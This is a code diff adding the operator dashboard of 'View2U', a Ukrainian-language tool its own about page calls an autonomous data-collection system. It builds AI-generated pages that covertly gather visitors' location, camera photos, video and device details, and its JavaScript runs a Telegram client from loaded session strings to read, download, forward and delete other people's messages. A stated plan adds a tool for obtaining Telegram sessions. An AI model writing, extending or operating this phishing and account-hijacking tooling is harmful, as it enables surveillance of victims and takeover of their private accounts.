+                        <div class="color-picker-group"><label>Фон кнопок полів вводу</label><input type="color" data-css-var="--input-button-background-color"></div>
+                        <div class="color-picker-group"><label>Другорядна кнопка (наведення)</label><input type="color" data-css-var="--button-secondary-hover-color"></div>
+                        <div class="color-picker-group"><label>Кнопка видалення</label><input type="color" data-css-var="--button-danger-color"></div>
+                        <div class="color-picker-group"><label>Кнопка видалення (наведення)</label><input type="color" data-css-var="--button-danger-hover-color"></div>
+                        <div class="color-picker-group"><label>Фон іконок розділів</label><input type="color" data-css-var="--section-icon-background-color"></div>
+                        <!-- Borders & Separators -->
+                        <div class="color-picker-group"><label>Обводка карток</label><input type="color" data-css-var="--card-border-color"></div>
+                        <div class="color-picker-group"><label>Розділювач бічної панелі</label><input type="color" data-css-var="--sidebar-separator-color"></div>
+                        <div class="color-picker-group"><label>Пункт меню (наведення)</label><input type="color" data-css-var="--sidebar-link-hover-color"></div>
+                         <!-- Statuses -->
+                        <div class="color-picker-group"><label>Статус "Опубліковано" (фон)</label><input type="color" data-css-var="--status-published-bg-color"></div>
+                        <div class="color-picker-group"><label>Статус "Опубліковано" (текст)</label><input type="color" data-css-var="--status-published-text-color"></div>
+                        <div class="color-picker-group"><label>Статус "В очікуванні" (фон)</label><input type="color" data-css-var="--status-pending-bg-color"></div>
+                        <div class="color-picker-group"><label>Статус "В очікуванні" (текст)</label><input type="color" data-css-var="--status-pending-text-color"></div>
+                        <div class="color-picker-group"><label>Статус "Не опубліковано" (фон)</label><input type="color" data-css-var="--status-unpublished-bg-color"></div>
+                        <div class="color-picker-group"><label>Статус "Не опубліковано" (текст)</label><input type="color" data-css-var="--status-unpublished-text-color"></div>
+                    </div>
+                    <button id="reset-theme-btn" class="btn btn-secondary mt-6">Скинути налаштування</button>
+                </section>
+
+                <section class="content-section">
+                     <div class="section-header">
+                        <div class="section-icon" style="background-color: #feefc7; color: #92400e;"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M15.362 5.214A8.252 8.252 0 0112 21 8.25 8.25 0 016.038 7.048 8.287 8.287 0 009 9.6a8.983 8.983 0 013.361-6.867 8.21 8.21 0 00-1.423-.488z" /><path stroke-linecap="round" stroke-linejoin="round" d="M12 18a3.75 3.75 0 00.495-7.467 5.99 5.99 0 00-1.925 3.546 5.974 5.974 0 01-2.133-1.001A3.75 3.75 0 0012 18z" /></svg></div>
+                        <div class="section-title"><h2>Секретний розділ</h2><p>Для особливих користувачів</p></div>
+                    </div>
+                    <form id="junimo-form" class="input-group max-w-sm">
+                        <input type="text" id="junimo-pass" class="input-field" placeholder="Введіть ключове слово...">
+                        <button type="submit" class="btn btn-primary">Pass</button>
+                    </form>
+                </section>
+            </div>
+
+
+            <div id="initial-loader">
+                <div class="initial-spinner"></div>
+                <p class="mt-4">Завантаження даних...</p>
+            </div>
+        </main>
+    </div>
+
+    <!-- Notification Container -->
+    <div id="notification-container" class="notification-container"></div>
+    <div id="context-menu" class="context-menu"></div>
+    <div id="junimo-container"></div>
+
+
+    <!-- Modals (Redesigned) -->
+    <dialog id="profile-modal" class="modal max-w-lg w-full">
+        <div class="modal-header">
+            <h2 class="modal-title">Профіль</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div class="modal-body space-y-4">
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Ім'я користувача</label>
+                <input id="profile-nickname" type="text" class="mt-1 input-field" readonly>
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Посилання для входу</label>
+                <input id="profile-login-link" type="text" class="mt-1 input-field" readonly onclick="this.select()">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Посилання на сторінку</label>
+                <input id="profile-page-link" type="text" class="mt-1 input-field" readonly onclick="this.select()">
+                <p class="mt-1 text-sm text-gray-500">Рекомендуємо зберегти це посилання.</p>
+            </div>
+        </div>
+    </dialog>
+
+    <dialog id="about-modal" class="modal max-w-2xl w-full">
+        <div class="modal-header">
+             <h2 class="modal-title">Про проєкт</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div class="modal-body">
+             <p class="text-center text-lg"><span class="font-bold text-gray-800">View2U</span> — це автономна система інтелектуального збору даних з інтеграцією ШІ.</p>
+             
+             <div class="about-card">
+                 <h3><span class="mr-2">🛠️</span>Вбудовані інструменти</h3>
+                 <ol class="list-disc list-inside space-y-2 text-gray-600">
+                     <li>Форми - гнучкий збір даних з будь-яких полів.</li>
+                     <li>Геолокація - отримання точних координат пристрою.</li>
+                     <li>Фото - збір зображень з фронтальної та основної камери.</li>
+                     <li>Відео - запис відео з обох камер.</li>
+                     <li>Автоматичний збір - IP, UserAgent, мова, екран, часова зона, платформа та ін.</li>
+                 </ol>
+             </div>
+
+             <div class="about-card">
+                 <h3><span class="mr-2">🚀</span>Версія 0.2.0 (2025-09-17)</h3>
+                 <ul class="list-disc list-inside space-y-2 text-gray-600">
+                     <li><b>Інтерфейс:</b> Повністю перероблено для кращої взаємодії.</li>
+                     <li><b>Відео:</b> Додано функціонал запису відео.</li>
+                     <li><b>Telegram Бот (v1.1.0):</b> Покращено стабільність та підтримку нових типів даних.</li>
+                     <li><b>Генерація ШІ (v0.2.0):</b> Покращено якість генерації сторінок.</li>
+                     <li><b>Стабільність:</b> Виправлено критичні помилки системи.</li>
+                 </ul>
+             </div>
+
+             <div class="about-card">
+                 <h3><span class="mr-2">🔮</span>Плани на майбутнє</h3>
+                 <ul class="list-disc list-inside space-y-2 text-gray-600">
+                     <li>Інструмент для отримання сесії Telegram.</li>
+                     <li>Інструмент запису аудіо.</li>
+                     <li>Виправлення помилки з відображенням завантажувача під модальними вікнами.</li>
+                     <li>Можливість створення тимчасових акаунтів (для Адмін-панелі).</li>
+                 </ul>
+             </div>
+        </div>
+    </dialog>
+    
+    <dialog id="clients-modal" class="modal max-w-4xl w-full">
+        <div class="modal-loader" id="clients-modal-loader">
+             <div class="modal-loader-content">
+                <div class="loader-spinner"></div>
+                <span class="font-medium">Оновлення...</span>
+            </div>
+        </div>
+        <div class="modal-header">
+            <h2 class="modal-title">Зібрані дані</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div id="clients-data-container" class="max-h-[70vh] overflow-y-auto"></div>
+        <div id="clients-modal-footer" class="modal-footer" style="display: none;">
+             <button onclick="handleDeleteSelected()" class="btn btn-danger">Видалити вибране</button>
+        </div>
+    </dialog>
+
+    <dialog id="page-editor-modal" class="modal max-w-4xl w-full">
+        <div class="modal-loader" id="editor-modal-loader">
+            <div class="modal-loader-content">
+                <div class="loader-spinner"></div>
+                <span id="editor-loader-message" class="font-medium">Обробка...</span>
+            </div>
+        </div>
+        <div class="modal-header">
+            <h2 id="modal-title" class="modal-title">Редактор сторінки</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div class="grid md:grid-cols-[250px_1fr] gap-6">
+                <div class="modal-sidebar space-y-4">
+                    <h3 class="text-lg font-medium">Джерело контенту</h3>
+                    <hr class="border-gray-200">
+                    <h4 class="text-base font-medium">Шаблони</h4>
+                    <div id="templates-list" class="space-y-2"></div>
+                    <button onclick="confirmClearEditor()" class="w-full text-left p-3 hover:bg-gray-100 rounded-md">Ввести свій (очистити)</button>
+                    <hr class="border-gray-200">
+                    <h4 class="text-base font-medium">Генерація з ШІ</h4>
+                    <form id="ai-form" class="space-y-2">
+                        <input type="text" id="ai-prompt" placeholder="Опишіть вашу сторінку..." class="input-field" required>
+                        <button type="submit" class="w-full btn btn-primary">Згенерувати</button>
+                    </form>
+                    <p id="ai-message" class="text-sm text-center"></p>
+                </div>
+                <div class="modal-content space-y-4">
+                    <div class="flex justify-between items-center">
+                        <h3 class="text-lg font-medium">HTML-код сторінки</h3>
+                        <div id="editor-controls">
+                            <button id="undo-btn" title="Скасувати (Ctrl+Z)">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2v1z"/><path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466z"/></svg>
+                            </button>
+                            <button id="redo-btn" title="Повторити (Ctrl+Y)">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"/><path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966a.25.25 0 0 1 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <textarea id="editor" placeholder="Оберіть шаблон або введіть свій HTML-код тут..." class="w-full p-4 border rounded-md shadow-sm bg-gray-50 font-mono text-sm min-h-[50vh] sm:min-h-[60vh] resize-y"></textarea>
+                    <form id="refine-form" class="space-y-2">
+                        <input type="text" id="refine-prompt" placeholder="Опишіть, як вдосконалити сторінку..." class="input-field">
+                        <button type="submit" class="w-full btn btn-primary">Відправити</button>
+                    </form>
+                    <p id="refine-message" class="text-sm text-center"></p>
+                </div>
+            </div>
+        </div>
+        <div class="modal-footer">
+            <button id="publish-btn" class="btn btn-primary">Опублікувати</button>
+        </div>
+    </dialog>
+
+    <dialog id="data-viewer-modal" class="modal max-w-2xl w-full">
+        <div class="modal-loader" id="data-viewer-loader">
+            <div class="modal-loader-content">
+                <div class="loader-spinner"></div>
+                <span class="font-medium">Завантаження даних...</span>
+            </div>
+        </div>
+        <div class="modal-header">
+            <h2 id="data-viewer-title" class="modal-title">Перегляд даних</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div id="data-viewer-content" class="modal-body"></div>
+    </dialog>
+
+    <dialog id="telegram-modal" class="modal max-w-lg w-full">
+        <div class="modal-header">
+            <h2 class="modal-title">Посилання для активації бота</h2>
+            <button class="modal-close-btn">&times;</button>
+        </div>
+        <div class="modal-body">
+            <p class="text-gray-600 mb-4">Натисніть на посилання нижче, щоб активувати сповіщення у вашому Telegram:</p>
+            <input id="telegram-link-input" type="text" class="w-full input-field mt-1" readonly onclick="this.select()">
+            <a id="telegram-link-button" href="#" target="_blank" class="block w-full text-center btn btn-primary mt-4">Перейти до бота</a>
+        </div>
+    </dialog>
+    
+    <dialog id="confirm-modal" class="modal max-w-sm w-full">
+        <div class="modal-body">
+            <h2 class="text-lg font-bold">Підтвердження дії</h2>
+            <p id="confirm-message" class="my-4">Ви впевнені?</p>
+        </div>
+        <div class="modal-footer">
+            <button id="confirm-no" class="btn btn-secondary">Скасувати</button>
+            <button id="confirm-yes" class="btn btn-danger">Підтвердити</button>
+        </div>
+    </dialog>
+    
+    <dialog id="telegram-client-modal" class="p-0 m-0 w-full h-full max-w-full max-h-full bg-white">
+        <div class="flex flex-col h-screen">
+            <header class="flex items-center justify-between p-2 bg-gray-50 border-b shadow-sm z-10 flex-shrink-0">
+                <div class="flex items-center">
+                    <button id="tg-back-btn" class="md:hidden text-gray-600 hover:text-blue-600 p-2 rounded-full mr-2 hidden">&larr;</button>
+                    <div id="tg-chat-header" class="flex-1 cursor-pointer p-2 rounded-lg hover:bg-gray-200 transition-colors" onclick="telegramManager.showCurrentEntityProfile()">
+                         <h3 class="font-bold text-lg truncate">Чати</h3>
+                         <p id="tg-chat-status" class="text-xs text-gray-500"></p>
+                    </div>
+                </div>
+                <button class="text-gray-500 hover:text-red-600 text-2xl p-2 rounded-full modal-close-btn">&times;</button>
+            </header>
+            <main class="flex flex-1 overflow-hidden relative min-h-0">
+                <aside id="tg-dialogs-list" class="w-full md:w-1/3 border-r bg-white overflow-y-auto"></aside>
+                <section id="tg-chat-view" class="w-full md:w-2/3 flex flex-col bg-white md:flex">
+                    <div id="tg-pinned-message-bar" class="p-2 bg-white border-b shadow-sm text-sm cursor-pointer hover:bg-gray-100 hidden"></div>
+                    <div id="tg-chat-content" class="flex-1 p-4 overflow-y-auto flex flex-col gap-2 relative">
+                        <div class="m-auto text-center text-gray-500"><p>Оберіть чат, щоб почати спілкування.</p></div>
+                    </div>
+                    <div id="tg-selection-bar" class="p-2 bg-white border-t shadow-inner flex justify-between items-center hidden">
+                        <div><span id="tg-selection-count" class="font-bold text-blue-600"></span></div>
+                        <div class="flex items-center gap-2">
+                            <button title="Переслати" class="p-2 text-gray-600 hover:text-blue-600 rounded-full" onclick="telegramManager.forwardSelectedMessages()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg></button>
+                            <button title="Видалити" class="p-2 text-gray-600 hover:text-red-600 rounded-full" onclick="telegramManager.deleteSelectedMessages()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
+                            <button title="Скасувати" class="p-2 text-gray-600 hover:text-gray-900 rounded-full" onclick="telegramManager.exitSelectionMode()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg></button>
+                        </div>
+                    </div>
+                    <div id="tg-message-input-container" class="p-2 md:p-4 bg-gray-50 border-t hidden flex-shrink-0">
+                        <div class="flex items-end gap-2 max-w-4xl mx-auto w-full">
+                            <button id="tg-file-btn" class="p-2 text-gray-600 hover:text-blue-600 rounded-full self-center flex-shrink-0"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13" /></svg></button>
+                            <input type="file" id="tg-file-input" class="hidden" accept="*/*">
+                            <textarea id="tg-message-input" placeholder="Напишіть повідомлення..." class="w-full p-2 border rounded-xl px-4 bg-white resize-none" rows="1"></textarea>
+                            <button id="tg-send-btn" class="bg-blue-600 text-white p-2 rounded-full hover:bg-blue-700 w-10 h-10 flex items-center justify-center flex-shrink-0 self-center disabled:bg-blue-300"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" /></svg></button>
+                        </div>
+                    </div>
+                </section>
+            </main>
+        </div>
+    </dialog>
+    
+    <div id="message-context-menu" class="context-menu"></div>
+    <div id="dialog-context-menu" class="context-menu"></div>
+    <dialog id="tg-profile-modal" class="modal rounded-lg shadow-2xl p-0 max-w-md w-full bg-white"><div id="tg-profile-content"></div></dialog>
+    <dialog id="tg-forward-modal" class="modal rounded-lg shadow-2xl p-0 max-w-md w-full bg-white"><div class="flex justify-between items-center p-4 border-b"><h2 class="text-lg sm:text-xl font-semibold">Переслати повідомлення</h2><button class="modal-close-btn">&times;</button></div><div id="tg-forward-dialog-list" class="max-h-[60vh] overflow-y-auto"></div></dialog>
+
+
+    <script>
+        const RENDER_AI_SERVICE_URL = 'https://bookish-broccoli.onrender.com'; 
+
+        const pageSection = document.getElementById('page-section');
+        const dataSection = document.getElementById('data-section');
+        const telegramSection = document.getElementById('telegram-section');
+
+        const dashboardContent = document.getElementById('dashboard-content');
+        const settingsContent = document.getElementById('settings-content');
+        const initialLoader = document.getElementById('initial-loader');
+        const globalLoader = document.getElementById('global-loader');
+        const loaderMessage = document.getElementById('loader-message');
+        const editorModalLoader = document.getElementById('editor-modal-loader');
+        const editorLoaderMessage = document.getElementById('editor-loader-message');
+        const editorModal = document.getElementById('page-editor-modal');
+        const profileModal = document.getElementById('profile-modal');
+        const aboutModal = document.getElementById('about-modal');
+        const clientsModal = document.getElementById('clients-modal');
+        const clientsDataContainer = document.getElementById('clients-data-container');
+        const clientsModalFooter = document.getElementById('clients-modal-footer');
+        const editor = document.getElementById('editor');
+        const templatesList = document.getElementById('templates-list');
+        const aiForm = document.getElementById('ai-form');
+        const aiPromptInput = document.getElementById('ai-prompt');
+        const aiMessage = document.getElementById('ai-message');
+        const publishBtn = document.getElementById('publish-btn');
+        const burgerMenu = document.getElementById('burger-menu');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        const profileBtn = document.getElementById('profile-btn');
+        const aboutBtn = document.getElementById('about-btn');
+        const refineForm = document.getElementById('refine-form');
+        const refinePromptInput = document.getElementById('refine-prompt');
+        const refineMessage = document.getElementById('refine-message');
+        const dataViewerModal = document.getElementById('data-viewer-modal');
+        const dataViewerTitle = document.getElementById('data-viewer-title');
+        const dataViewerContent = document.getElementById('data-viewer-content');
+        const dataViewerLoader = document.getElementById('data-viewer-loader');
+        const telegramModal = document.getElementById('telegram-modal');
+        const telegramLinkInput = document.getElementById('telegram-link-input');
+        const telegramLinkButton = document.getElementById('telegram-link-button');
+        const confirmModal = document.getElementById('confirm-modal');
+        const confirmMessage = document.getElementById('confirm-message');
+        const confirmYesBtn = document.getElementById('confirm-yes');
+        const confirmNoBtn = document.getElementById('confirm-no');
+        const telegramClientModal = document.getElementById('telegram-client-modal');
+        const tgProfileModal = document.getElementById('tg-profile-modal');
+        const tgForwardModal = document.getElementById('tg-forward-modal');
+        
+        function openModal(modalElement) {
+            if (modalElement && typeof modalElement.showModal === 'function') {
+                modalElement.showModal();
+                document.body.classList.add('modal-open');
+            }
+        }
+
+        function closeModal(modalElement) {
+            if (modalElement && typeof modalElement.close === 'function') {
+                modalElement.close();
+            }
+        }
+        
+        document.querySelectorAll('dialog.modal, dialog').forEach(modal => {
+            modal.addEventListener('close', () => {
+                const anyModalOpen = !!document.querySelector('dialog[open]');
+                if (!anyModalOpen) {
+                    document.body.classList.remove('modal-open');
+                }
+            });
+             modal.querySelectorAll('.modal-close-btn').forEach(btn => {
+                btn.addEventListener('click', () => closeModal(modal));
+            });
+        });
+
+        const telegramManager = {
+            sessionString: null,
+            dialogs: [],
+            currentDialogId: null,
+            me: null,
+            
+            checkSession() {
+                if (!this.sessionString) {
+                    showAlert('Telegram сесія не завантажена. Будь ласка, спочатку завантажте сесію.', 'error');
+                    return false;
+                }
+                return true;
+            },
+            isSendingMessage: false,
+            selectedMessages: [],
+            selectionMode: false,
+
+            async open(timestamp) {
+                const token = localStorage.getItem('jwt_token');
+                const params = new URLSearchParams();
+                if (timestamp) params.set('ts', String(timestamp));
+                if (token) params.set('token', token);
+                const url = `/user/telegram.html?${params.toString()}`;
+                window.open(url, '_blank', 'noopener');
+            },
+            async getMe() {
+                if (!this.checkSession()) return null;
+                if(this.me) return this.me;
+                this.me = await apiCall('getMe', { sessionString: this.sessionString });
+                return this.me;
+            },
+            async loadDialogs() {
+                if (!this.checkSession()) return;
+                
+                const dialogsContainer = document.getElementById('tg-dialogs-list');
+                dialogsContainer.innerHTML = '<div class="p-4 text-center text-gray-500"><div class="loading-dots">Завантаження чатів</div></div>';
+                try {
+                    const filters = await apiCall('getTelegramDialogFilters', { sessionString: this.sessionString });
+                    this.dialogFilters = Array.isArray(filters) ? filters : [];
+                    const dialogs = await apiCall('getTelegramDialogs', { sessionString: this.sessionString, filterId: this.currentFilterId });
+                    this.dialogs = dialogs;
+
+                    if (this.currentCategory == null) this.currentCategory = 'all';
+                    
+                    const meButtonHtml = `<div class="p-3 flex items-center gap-3 cursor-pointer hover:bg-gray-100 border-b transition-colors" onclick="telegramManager.showMyProfile()">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold">M</div>
+                        <div class="flex-1 overflow-hidden"><p class="font-semibold text-gray-800">Мій профіль</p></div>
+                    </div>`;
+
+                    const filtersBar = `
+                        <div class="p-2 border-b bg-white sticky top-0 z-10">
+                            <div class="flex flex-wrap gap-2 mb-2">
+                                <div class="flex gap-2 overflow-auto">
+                                    <button class="px-3 py-1 rounded-full border text-sm ${!this.currentFilterId?'bg-blue-600 text-white border-blue-600':'bg-white'}" onclick=\"telegramManager.setFilter(null)\">Усі</button>
+                                    ${this.dialogFilters.map(f => `<button class=\"px-3 py-1 rounded-full border text-sm ${this.currentFilterId===f.id?'bg-blue-600 text-white border-blue-600':'bg-white'}\" onclick=\"telegramManager.setFilter(${f.id})\">${f.title}</button>`).join('')}
+                                </div>
+                            </div>
+                        </div>`;
+
+                    dialogsContainer.innerHTML = filtersBar + meButtonHtml + dialogs
+                        .map(dialog => `
+                        <div id="dialog-${dialog.id}" class="p-3 flex items-center gap-3 cursor-pointer hover:bg-blue-50 transition-colors" 
+                             onclick="telegramManager.loadChat('${dialog.id}')"
+                             oncontextmenu="event.preventDefault(); telegramManager.showDialogActions(event, '${dialog.id}', ${dialog.isUser})">
+                            <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold flex-shrink-0">
+                                ${dialog.title.charAt(0).toUpperCase()}
+                            </div>
+                            <div class="flex-1 overflow-hidden">
+                                <p class="font-semibold text-gray-800 truncate">${dialog.title}</p>
+                                <p class="text-sm text-gray-500 truncate">${dialog.message || ''}</p>
+                            </div>
+                            ${dialog.unreadCount > 0 ? `<span class="ml-auto bg-blue-500 text-white text-xs font-bold px-2 py-1 rounded-full">${dialog.unreadCount}</span>` : ''}
+                        </div>
+                    `).join('');
+                } catch(error) {
+                    dialogsContainer.innerHTML = `<p class="p-4 text-center text-red-500">${error.message}</p>`;
+                }
+            },
+            setFolder(folderId){ this.currentFolderId = folderId; this.loadDialogs(); },
+            setCategory(cat){ this.currentCategory = cat; this.loadDialogs(); },
+            setFilter(id){ this.currentFilterId = id; this.loadDialogs(); },
+            async transferGift(){
+                const to = document.getElementById('gift-to').value.trim();
+                const amount = parseInt(document.getElementById('gift-amount').value, 10) || 1;
+                if(!to){ showAlert('Вкажіть отримувача', 'warning'); return; }
+                try {
+                    const by = /[a-zA-Z]/.test(to) ? 'nickname' : 'id';
+                    const res = await apiCall('transferGift', { token: localStorage.getItem('jwt_token'), to, by, amount });
+                    if(res && res.success){
+                        userData.gifts = res.fromGifts;
+                        renderContent();
+                        showAlert('Подарунок надіслано!', 'success');
+                    }
+                } catch(e) {
+                    showAlert(e.message || 'Не вдалося надіслати подарунок', 'error');
+                }
+            },
+            async loadChat(dialogId) {
+                if (!this.checkSession()) return;
+                
+                this.exitSelectionMode();
+                this.currentDialogId = dialogId;
+                telegramClientModal.classList.add('chat-active');
+                document.getElementById('tg-back-btn').classList.remove('hidden');
+                
+                document.querySelectorAll('#tg-dialogs-list > div').forEach(el => el.classList.remove('bg-blue-100'));
+                document.getElementById(`dialog-${dialogId}`)?.classList.add('bg-blue-100');
+                
+                const chatContent = document.getElementById('tg-chat-content');
+                const chatHeader = document.getElementById('tg-chat-header').querySelector('h3');
+                const chatStatus = document.getElementById('tg-chat-status');
+                const messageInputContainer = document.getElementById('tg-message-input-container');
+                
+                chatHeader.textContent = 'Завантаження...';
+                chatStatus.textContent = '';
+                chatContent.innerHTML = '<div class="p-8 text-center text-gray-500"><div class="loading-dots">Завантаження повідомлень</div></div>';
+                messageInputContainer.classList.add('hidden');
+                
+                await new Promise(resolve => setTimeout(resolve, 100));
+                
+                const dialog = this.dialogs.find(d => d.id == dialogId);
+                if (!dialog) return;
+
+                chatHeader.textContent = dialog.title;
+                
+                try {
+                    const entityInfo = await apiCall('getTelegramEntityInfo', { sessionString: this.sessionString, entityId: dialogId });
+                    if(entityInfo.full.pinnedMsgId) {
+                        const pinnedMessage = await apiCall('getTelegramMessages', { sessionString: this.sessionString, dialogId, ids: [entityInfo.full.pinnedMsgId] });
+                        if(pinnedMessage.length > 0) {
+                            const pinnedBar = document.getElementById('tg-pinned-message-bar');
+                            pinnedBar.innerHTML = `<strong>Закріплено:</strong> ${pinnedMessage[0].message}`;
+                            pinnedBar.classList.remove('hidden');
+                        }
+                    } else {
+                        document.getElementById('tg-pinned-message-bar').classList.add('hidden');
+                    }
+                    
+                    const messages = await apiCall('getTelegramMessages', { sessionString: this.sessionString, dialogId });
+                    let messagesHtml = '';
+                    let unreadSeparatorPlaced = false;
+
+                    messages.reverse().forEach((message) => {
+                        if (message.unread && !unreadSeparatorPlaced) {
+                            messagesHtml += `<div class="text-center my-2"><span class="bg-white px-2 py-1 rounded-full text-blue-600 text-xs font-semibold shadow">Непрочитані повідомлення</span></div>`;
+                            unreadSeparatorPlaced = true;
+                        }
+                        
+                        let mediaHtml = '';
+                        let textHtml = message.message ? `<p class="text-sm break-words whitespace-pre-wrap">${message.message.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</p>` : '';
+                        
+                        if (message.media) {
+                            let mediaType = 'Вкладення';
+                            let mediaIcon = '📎';
+                            if (message.media.className.toLowerCase().includes('photo')) { mediaType = 'Фото'; mediaIcon = '🖼️'; }
+                            if (message.media.className.toLowerCase().includes('document')) { mediaType = 'Документ'; mediaIcon = '📄'; }
+                            if (message.media.className.toLowerCase().includes('video')) { mediaType = 'Відео'; mediaIcon = '🎥'; }
+                            if (message.media.className.toLowerCase().includes('voice')) { mediaType = 'Голосове'; mediaIcon = '🎵'; }
+                            
+                            if (message.media.downloadable) {
+                                mediaHtml = `<a href="#" onclick="telegramManager.downloadMedia(event, '${dialog.id}', ${message.id})" class="text-blue-600 hover:underline flex items-center gap-2 p-2 bg-blue-50 rounded-lg border border-blue-200 hover:bg-blue-100 transition-colors">
+                                    <span class="text-lg">${mediaIcon}</span>
+                                    <span class="font-medium">Переглянути ${mediaType}</span>
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
+                                </a>`;
+                            } else {
+                                mediaHtml = `<span class="text-gray-500 italic flex items-center gap-2 p-2 bg-gray-50 rounded-lg">${mediaIcon} [${mediaType}]</span>`;
+                            }
+                        }
+
+                        if (textHtml || mediaHtml) {
+                            const messageId = message.id;
+                             messagesHtml += `<div id="msg-${messageId}" class="p-2 my-1 rounded-lg message-bubble ${message.out ? 'bg-blue-100 self-end' : 'bg-white self-start'} max-w-lg flex flex-col group relative shadow-sm" oncontextmenu="event.preventDefault(); telegramManager.showMessageActions(event, ${messageId}, '${btoa(encodeURIComponent(message.message || ''))}')" onclick="telegramManager.handleMessageClick(${messageId})">
+                                ${mediaHtml ? `<div class="mb-1">${mediaHtml}</div>` : ''}
+                                ${textHtml}
+                                <div class="text-xs text-gray-400 text-right mt-1 flex items-center justify-between">
+                                    ${message.pinned ? '<span class="text-amber-600">📌</span>' : '<span></span>'}
+                                    <span>${new Date(message.date * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
+                                    <button class="text-gray-500 hover:text-gray-700 px-1" onclick="event.stopPropagation(); telegramManager.showMessageActions(event, ${messageId}, '${btoa(encodeURIComponent(message.message || ''))}')">⋮</button>
+                                </div>
+                            </div>`;
+                        }
+                    });
+                    chatContent.innerHTML = messagesHtml;
+                    chatContent.scrollTop = chatContent.scrollHeight;
+
+                    if (!dialog.isChannel || dialog.isGroup) {
+                        messageInputContainer.classList.remove('hidden');
+                    }
+                } catch(error) {
+                    chatContent.innerHTML = `<div class="p-8 text-center text-red-500">${error.message}</div>`;
+                }
+            },
+            async downloadMedia(event, dialogId, messageId) {
+                event.preventDefault();
+                const link = event.target.closest('a');
+                const originalText = link.innerHTML;
+                link.innerHTML = 'Завантаження...';
+                
+                if (!this.checkSession()) {
+                    link.innerHTML = originalText;
+                    return;
+                }
+                
+                try {
+                    const res = await fetch('/.netlify/functions/public-api', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            action: 'downloadTelegramMedia', 
+                            payload: { token: localStorage.getItem('jwt_token'), sessionString: this.sessionString, dialogId, messageId, useTemporaryStorage: true } 
+                        })
+                    });
+                    if (!res.ok) {
+                        const errorText = await res.text();
+                        let errorMessage = errorText;
+                        try {
+                            const errorData = JSON.parse(errorText);
+                            if (errorData.code === 'MISSING_SESSION_STRING') {
+                                errorMessage = 'Помилка: Telegram сесія не завантажена. Будь ласка, спочатку завантажте сесію.';
+                            } else if (errorData.message) {
+                                errorMessage = errorData.message;
+                            }
+                        } catch (e) {}
+                        throw new Error(errorMessage);
+                    }
+                    
+                    const mediaData = await res.json();
+                    
+                    if (!mediaData.url && !mediaData.dataUrl) {
+                        throw new Error('Немає даних медіа');
+                    }
+                    
+                    this.openMediaInNewWindow(mediaData);
+                    
+                } catch(e) {
+                    showAlert('Не вдалося завантажити медіа: ' + e.message, 'error');
+                } finally {
+                    link.innerHTML = originalText;
+                }
+            },
+            openMediaInNewWindow(mediaData) {
+                const newWindow = window.open('', '_blank');
+                const mediaUrl = mediaData.url || mediaData.dataUrl;
+                
+                newWindow.document.write(`
